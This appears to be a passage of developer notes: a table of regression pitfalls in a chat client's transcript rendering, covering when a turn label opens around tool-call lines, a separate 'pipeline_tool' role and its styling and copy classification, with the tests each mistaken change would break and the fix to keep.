| Removing `_open_label()` from `_render_entry`'s `tool` branch | Every test in `TestTheToolLineOpensTheTurn` fails: a turn whose first output is a tool call (the normal MCP shape) draws the call under `you ›` and the label above the prose that followed | Restore the call. The guard inside `_open_label` keeps the mid-turn half of §43 true — `test_a_tool_line_does_not_re_open_a_label` still passes with the branch present |
| "Fixing" the mid-turn shape by clearing `_label_in_force` at a tool line | `test_one_label_across_tool_batches` and the §43 tests fail: the label re-opens after every batch — the exact defect §43 retired | One label per TURN. A tool line inside the turn is part of what the label already announced |
| Reverting the research `write_role` in `on_pipeline_event_message` from `pipeline_tool` to `tool` | `test_a_pipeline_tool_line_never_opens_the_label` fails: a research run's label moves from the report to the run's first tool call — a rendering change nobody decided | Keep the role split. The run is the harness working; the report is the model answering |
| Rendering `pipeline_tool` through the `else` branch (deleting the dedicated branch) | `test_a_pipeline_tool_line_renders_with_the_tool_style` fails: `_style("pipeline_tool")` has no palette entry, so the line goes out UNSTYLED — and nothing else notices, because the text is identical either way | Keep the alias branch (`self._style("tool")`). Adding `pipeline_tool` to `role_styles` instead would put an identical style string beside `tool` in MESSAGE_ROLES and fail the pairwise-distinctness pin in `test_themes.py` |
| Classifying `pipeline_tool` as META "for consistency" | `/copy conversation` for a research run loses the tool lines — batch 48 documented the copy as "the query, the tool lines and the report" | `pipeline_tool` is CONVERSATION. The label opener and the copy filter are different questions; do not merge them |
| Adding `pipeline_tool` to `MESSAGE_ROLES` | `test_the_message_roles_are_pairwise_distinct` fails wherever `tool` and `pipeline_tool` share the aliased style | It lives in `ENTRY_ROLES` beside `assistant` and `diff` — reachable, classified, and skipped by the colour checks |

Count 3510 -> 3517.
